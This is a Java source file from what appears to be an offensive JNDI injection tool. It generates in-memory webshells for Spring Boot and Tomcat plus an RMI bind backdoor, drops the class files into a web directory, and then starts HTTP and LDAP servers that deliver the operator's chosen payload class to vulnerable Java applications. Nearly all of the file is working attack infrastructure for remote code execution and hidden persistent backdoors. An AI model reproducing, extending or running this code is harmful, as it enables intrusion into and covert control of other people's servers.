package com.generate;

import com.Usage;
import com.dto.ClassDto;
import com.server.HttpServer;
import com.server.LdapServer;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.io.File;
import java.io.FileOutputStream;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.rmi.RemoteException;
import java.util.HashMap;
import java.util.Random;
import java.util.Scanner;

public class Jndi {
    //todo: rmi echo
    public static void ldapBase(HashMap<String, String> args){
        ldapServerStart(args);

    }


    public static void ldapServerStart(HashMap<String, String> args){
        if (args.get("webPath")==null) {
            System.out.println("[-] Need \"webPath\" or \"className\"");
            Usage.printUsage();
            return;
        }

        int httpServerPort;
        int jndiServerPort;
        String httpServerIp = args.get("httpServerIp");
        String jndiServerIp = args.get("jndiServerIp");
        String webPath = args.get("webPath");
        String className = args.get("className");

        Random random = new Random();
        if (args.get("httpServerPort") == null){
            httpServerPort = random.nextInt(20000) + 10000;
        }else {
            httpServerPort = Integer.parseInt(args.get("httpServerPort"));
        }
        if (args.get("jndiServerPort") == null){
            jndiServerPort = random.nextInt(20000) + 10000;
            if (jndiServerPort == httpServerPort)
                jndiServerPort = random.nextInt(20000) + 10000;
        }else{
            jndiServerPort = Integer.parseInt(args.get("jndiServerPort"));
        }


        try {
            if (httpServerIp == null)
                httpServerIp = InetAddress.getLocalHost().getHostAddress();
            if (jndiServerIp == null)
                jndiServerIp = InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }

        //内存马生成
        String url = args.get("url");
        String commandArg = args.get("commandArg");
        String header = args.get("header");
        String headerValue = args.get("headerValue");

        if (url == null)
            url = Utils.randomString(4);
        if (commandArg == null)
            commandArg = Utils.randomString(4);

        try {
            //生成SpringBoot内存马，以RegisterHandler方式注册
            ClassDto springBootClassDto = GenerateAttack.SpringRegisterHandler(url, commandArg, header, headerValue);
            args.put("filePath", webPath);
            System.out.println("[+] \"SpringBoot\" Memory Shell Generate: ");
            PostGenerate.dispatch(springBootClassDto, "classFile", args);

            ClassDto tomcatFilterClassDto = GenerateAttack.tomcatFilter(url, commandArg, header, headerValue, "6789");
            args.put("filePath", webPath);
            System.out.println("[+] \"Tomcat Filter 6,7,8,9\" Memory Shell Generate: ");
            PostGenerate.dispatch(tomcatFilterClassDto, "classFile", args);

            int randomPort = random.nextInt(30000) + 12000;

            ClassDto rmiBindEcho = RmiBind.bind(randomPort);
            args.put("filePath", webPath);
            System.out.println("[+] \"Rmi Bind Echo\" Memory Shell Generate: ");
            System.out.println("[+] RMI Port: " + randomPort);
            PostGenerate.dispatch(rmiBindEcho, "classFile", args);

        } catch (Exception e) {
            e.printStackTrace();
        }

        //询问要用哪个Payload，或是自定义Payload
        System.out.println("[i] 从上面的全类名中选择一个作为Payload，或在web path中自定义的类全类名:");
        System.out.println("[i] type a class name from the above Qualified Class Name, or use your custom class name from web path:");
        Scanner scanner = new Scanner(System.in);
        String userClassName = scanner.next();

        final String httpAddress = httpServerIp;
        final int httpPort = httpServerPort;
        final String ldapAddress = jndiServerIp;
        final int ldapPort = jndiServerPort;

        Thread httpServerThread = new Thread(new Runnable() {
            @Override
            public void run() {
                HttpServer.runServer(httpAddress, httpPort, webPath);
            }
        });
        httpServerThread.start();
        String httpServerUrl = "http://" + httpAddress + ":" + httpPort + "/";

        Thread ldapServerThread = new Thread(new Runnable() {
            @Override
            public void run() {
                LdapServer.runServer(ldapPort, httpServerUrl, userClassName);
            }
        });
        ldapServerThread.start();
    }

    public ClassDto ldapUnSerialize(String payload){
        return null;
    }
}
